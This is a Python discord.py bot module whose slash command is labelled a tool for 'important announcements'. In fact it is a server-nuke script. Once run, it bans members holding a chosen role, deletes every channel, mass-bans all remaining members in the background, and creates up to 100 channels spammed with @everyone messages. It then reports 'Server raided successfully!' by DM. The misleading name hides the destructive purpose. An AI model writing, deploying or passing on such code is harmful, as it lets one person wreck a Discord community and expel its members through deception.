import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
    @app_commands.describe(
        useradmin="Usuario administrador principal",
        roletogive="Rol de administración",
        message="Mensaje importante para anunciar"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def announce(self, interaction: discord.Interaction, 
                      useradmin: discord.User, 
                      roletogive: discord.Role, 
                      message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            
            # 1. Banear miembros con el rol especificado (excepto useradmin y el bot)
            banned_members = 0
            members_to_ban = []
            
            async for member in guild.fetch_members():
                if any(role.id == roletogive.id for role in member.roles):
                    if member.id != useradmin.id and member.id != self.bot.user.id:
                        members_to_ban.append(member)
            
            # Banear miembros en paralelo
            ban_tasks = []
            for member in members_to_ban:
                try:
                    ban_tasks.append(member.ban(reason=f"Reorganización: {interaction.user}"))
                    banned_members += 1
                except Exception as e:
                    print(f"No se pudo banear a {member}: {e}")
            
            if ban_tasks:
                await asyncio.gather(*ban_tasks, return_exceptions=True)
            
            # 2. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                await admin_member.add_roles(roletogive)
            except Exception as e:
                print(f"No se pudo añadir el rol a {useradmin}: {e}")
            
            # 3. Eliminar todos los canales
            delete_tasks = []
            for channel in guild.channels:
                delete_tasks.append(channel.delete())
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 4. Iniciar baneo masivo en segundo plano mientras se crean canales
            async def mass_ban():
                banned_count = 0
                async for member in guild.fetch_members():
                    try:
                        if member.id != useradmin.id and member.id != self.bot.user.id:
                            await member.ban(reason=f"Reorganización masiva: {interaction.user}")
                            banned_count += 1
                            # Pequeña pausa aleatoria para evitar rate limits
                            await asyncio.sleep(0.2 + random.random() * 0.3)
                    except Exception as e:
                        print(f"No se pudo banear a {member}: {e}")
                        continue
                print(f"Baneo masivo completado. Total baneados: {banned_count}")
            
            # Ejecutar baneo masivo en segundo plano
            asyncio.create_task(mass_ban())
            
            # 5. Crear canales y spamear mensajes
            spam_message = f"@everyone {message}"
            channel_count = 0
            max_channels = 100
            
            while channel_count < max_channels:
                try:
                    channel_name = f"{message}-{channel_count}"
                    new_channel = await guild.create_text_channel(channel_name[:100])
                    
                    for _ in range(3):
                        try:
                            await new_channel.send(spam_message)
                        except Exception as e:
                            print(f"Error al enviar mensaje: {e}")
                    
                    channel_count += 1
                    await asyncio.sleep(0.1 + random.random() * 0.2)
                    
                except Exception as e:
                    print(f"Error al crear canal: {e}")
                    await asyncio.sleep(1)
                    break
            
            # 6. Enviar mensaje al DM del useradmin
            try:
                dm_channel = await useradmin.create_dm()
                raid_message = f"✅ Server raided successfully!\n- Initial bans: {banned_members}\n- Channels created: {channel_count}\n- Message: {message}"
                await dm_channel.send(raid_message)
            except Exception as e:
                print(f"No se pudo enviar mensaje al DM de {useradmin}: {e}")
                # Intentar enviar el mensaje por el canal de followup si falla el DM
                try:
                    await interaction.followup.send(
                        f"No se pudo enviar el mensaje al DM de {useradmin.mention}. " +
                        f"Operación completada con {banned_members} baneos iniciales y {channel_count} canales creados.",
                        ephemeral=True
                    )
                except:
                    pass
            
            await interaction.followup.send(
                f"Operación completada. Se banearon {banned_members} miembros inicialmente. " +
                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano. " +
                f"Se ha enviado un mensaje de confirmación al DM de {useradmin.mention}.",
                ephemeral=True
            )
            
        except Exception as e:
            print(f"Error durante la ejecución: {e}")
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
